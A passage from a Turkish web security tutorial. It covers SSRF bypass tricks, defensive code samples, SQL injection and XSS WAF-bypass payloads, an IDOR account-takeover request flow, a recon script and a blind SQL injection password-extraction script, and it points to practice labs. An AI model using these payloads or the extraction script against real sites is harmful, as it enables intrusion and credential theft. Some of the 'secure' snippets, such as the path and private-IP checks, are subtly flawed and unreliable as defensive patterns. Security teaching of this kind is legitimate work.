**Blacklist Bypass:**
```
localhost → 127.0.0.1 → 127.1 → 0.0.0.0
localhost → [::1]
localhost → localtest.me
```

**URL Parsing Tricks:**
```
http://example.com@localhost
http://localhost#example.com
http://example.com.localhost
```

---

## Level 4: Savunma Stratejileri

### 🛡️ Broken Access Control Savunması

#### **✅ Güvenli Kod Örnekleri**

**IDOR Koruması (PHP):**
```php
<?php
session_start();

$requested_user_id = $_GET['user_id'];
$logged_in_user_id = $_SESSION['user_id'];

// Kullanıcı sadece kendi profilini görebilir
if ($requested_user_id != $logged_in_user_id) {
    http_response_code(403);
    die("Access Denied");
}

$query = "SELECT * FROM users WHERE id = ?";
$stmt = $conn->prepare($query);
$stmt->bind_param("i", $logged_in_user_id);
$stmt->execute();
?>
```

**Path Traversal Koruması (Python):**
```python
import os
from flask import Flask, request, send_file, abort

UPLOAD_FOLDER = '/var/www/uploads'

@app.route('/download')
def download_file():
    filename = request.args.get('file')
    
    # Güvenli yol oluşturma
    safe_path = os.path.join(UPLOAD_FOLDER, filename)
    
    # Path traversal kontrolü
    if not os.path.abspath(safe_path).startswith(UPLOAD_FOLDER):
        abort(403)
    
    # Dosya var mı kontrolü
    if not os.path.isfile(safe_path):
        abort(404)
    
    return send_file(safe_path)
```

### 🔐 Cryptographic Failures Savunması

**✅ Güvenli Şifre Saklama (bcrypt):**

```python
import bcrypt

# Şifre hashleme (kayıt sırasında)
def hash_password(password):
    salt = bcrypt.gensalt(rounds=12)  # Cost factor: 12
    hashed = bcrypt.hashpw(password.encode('utf-8'), salt)
    return hashed

# Şifre doğrulama (giriş sırasında)
def verify_password(password, hashed):
    return bcrypt.checkpw(password.encode('utf-8'), hashed)
```

**PHP (password_hash):**
```php
<?php
// Kayıt
$hashed_password = password_hash($password, PASSWORD_BCRYPT, ['cost' => 12]);

// Giriş
if (password_verify($password, $hashed_password)) {
    echo "Giriş başarılı!";
}
?>
```

### 💉 Injection Savunması

**✅ Prepared Statements (SQL Injection Koruması):**

```php
<?php
// ❌ GÜVENSİZ
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";

// ✅ GÜVENLİ - Prepared Statement
$stmt = $conn->prepare("SELECT * FROM users WHERE username=? AND password=?");
$stmt->bind_param("ss", $username, $hashed_password);
$stmt->execute();
?>
```

**Parameterized Query (Python):**
```python
# ✅ GÜVENLİ
cursor.execute("SELECT * FROM users WHERE username=? AND email=?", (username, email))
```

**Command Injection Koruması:**
```python
import subprocess
import shlex

# ❌ GÜVENSİZ
os.system("ping " + ip)

# ✅ GÜVENLİ - shlex.quote kullan
safe_ip = shlex.quote(ip)
subprocess.run(["ping", "-c", "4", safe_ip])
```

### 🔒 Authentication Savunması

**✅ Güvenli Session Yönetimi:**
```php
<?php
session_start();

// Login sonrası session ID'yi yenile
if (login_successful()) {
    session_regenerate_id(true);  // Eski session'ı sil
    $_SESSION['user_id'] = $user_id;
    $_SESSION['ip_address'] = $_SERVER['REMOTE_ADDR'];
    $_SESSION['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
}

// Her istekte session doğrulama
function validate_session() {
    if ($_SESSION['ip_address'] != $_SERVER['REMOTE_ADDR']) {
        session_destroy();
        die("Session hijacking detected!");
    }
}
?>
```

**Rate Limiting (Python/Flask):**
```python
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(app, key_func=get_remote_address)

@app.route('/login', methods=['POST'])
@limiter.limit("5 per minute")  # Dakikada 5 deneme
def login():
    # Login logic
    pass
```

### 🛡️ SSRF Savunması

**✅ URL Whitelist:**
```python
import re
from urllib.parse import urlparse

ALLOWED_DOMAINS = ['api.example.com', 'cdn.example.com']

def fetch_url(url):
    parsed = urlparse(url)
    
    # Protokol kontrolü
    if parsed.scheme not in ['http', 'https']:
        raise ValueError("Invalid protocol")
    
    # Domain whitelist kontrolü
    if parsed.netloc not in ALLOWED_DOMAINS:
        raise ValueError("Domain not allowed")
    
    # Private IP kontrolü
    if is_private_ip(parsed.netloc):
        raise ValueError("Private IP not allowed")
    
    return requests.get(url)

def is_private_ip(hostname):
    private_ranges = [
        '127.', '10.', '172.16.', '172.31.', '192.168.', '169.254.'
    ]
    return any(hostname.startswith(range) for range in private_ranges)
```

---

## Level 5: İleri Seviye Teknikler

### 🔥 WAF Bypass Teknikleri

#### **1. SQL Injection WAF Bypass**

**Case Manipulation:**
```sql
' UnIoN SeLeCt 1,2,3--
```

**Comment Insertion:**
```sql
'/**/UNION/**/SELECT/**/1,2,3--
```

**URL Encoding:**
```
%27%20UNION%20SELECT%201,2,3--
```

**Double Encoding:**
```
%2527%2520UNION%2520SELECT%25201,2,3--
```

**Inline Comments:**
```sql
'/*!50000UNION*//*!50000SELECT*/1,2,3--
```

#### **2. XSS WAF Bypass**

**HTML Entity Encoding:**
```html
&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
```

**Alternate Event Handlers:**
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
```

**Unicode Bypass:**
```javascript
<script>\u0061lert(1)</script>
```

### 🔗 Vulnerability Chaining

**Senaryo: IDOR + XSS → Account Takeover**

```
1. IDOR ile başka kullanıcının email adresini değiştir
2. XSS ile reset password linkini çal
3. Kendi email'ine password reset linki gelir
4. Account takeover tamamlandı!
```

**Exploit Flow:**
```http
# 1. Email değiştirme (IDOR)
POST /api/user/123/update HTTP/1.1
{"email": "attacker@evil.com"}

# 2. Password reset iste
POST /api/password-reset HTTP/1.1
{"email": "victim@example.com"}

# 3. Attacker'ın mailine link gelir
# 4. Hesap ele geçirilir!
```

### 🤖 Automation & Custom Scripts

**Recon Automation (Bash):**
```bash
#!/bin/bash
TARGET=$1

echo "[+] Subdomain Enumeration"
subfinder -d $TARGET -o subdomains.txt

echo "[+] Port Scanning"
nmap -iL subdomains.txt -oA nmap_scan

echo "[+] Directory Bruteforce"
while read subdomain; do
    ffuf -u "https://$subdomain/FUZZ" -w wordlist.txt -o "$subdomain-dirs.json"
done < subdomains.txt

echo "[+] Vulnerability Scanning"
nuclei -l subdomains.txt -t ~/nuclei-templates/
```

**Custom SQLi Exploiter (Python):**
```python
import requests
import string

def blind_sqli_exploit(url, parameter):
    result = ""
    
    for position in range(1, 50):
        for char in string.printable:
            payload = f"' AND SUBSTRING(password,{position},1)='{char}'--"
            
            params = {parameter: payload}
            response = requests.get(url, params=params)
            
            if "Welcome" in response.text:
                result += char
                print(f"[+] Found: {result}")
                break
        
        if char == ' ':  # Tamamlandı
            break
    
    return result

password = blind_sqli_exploit("http://example.com/login.php", "username")
print(f"[+] Password: {password}")
```

---

## Kaynaklar ve Laboratuvar Ortamları

### 🧪 Pratik Yapabileceğiniz Platformlar

**1. OWASP WebGoat**
```bash
docker run -p 8080:8080 webgoat/goatandwolf
```

**2. DVWA (Damn Vulnerable Web Application)**
```bash
docker run -p 80:80 vulnerables/web-dvwa
```

**3. bWAPP**
```bash
docker run -p 80:80 raesene/bwapp
```

**4. HackTheBox & TryHackMe**
- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)

### 📚 Öğrenme Kaynakları

**Kitaplar:**
- The Web Application Hacker's Handbook
- OWASP Testing Guide
- Bug Bounty Bootcamp

**Video Kurslar:**
- Portswigger Web Security Academy
- PentesterLab
- HackerOne Hacktivity

**Cheat Sheets:**
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [HackTricks](https://book.hacktricks.xyz/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)

---

## 🎓 Sonuç

Bu rehber, sizi **sıfırdan profesyonel bir web güvenlik uzmanına** dönüştürmek için tasarlanmıştır. 

**Hatırlatma:**
- ✅ Sadece kendi sistemlerinizde veya izin aldığınız sistemlerde test yapın
- ✅ Bug bounty programlarına katılın (legal)
- ✅ Sürekli pratik yapın
- ✅ Toplulukla öğrenin (Discord, Reddit, Twitter)

> **"Güvenlik bir ürün değil, bir süreçtir."** - Bruce Schneier

**Başarılar! 🚀**

---

**Yazar:** Cybersecurity Education Team  
**Versiyon:** 1.0 (2024)  
**Lisans:** MIT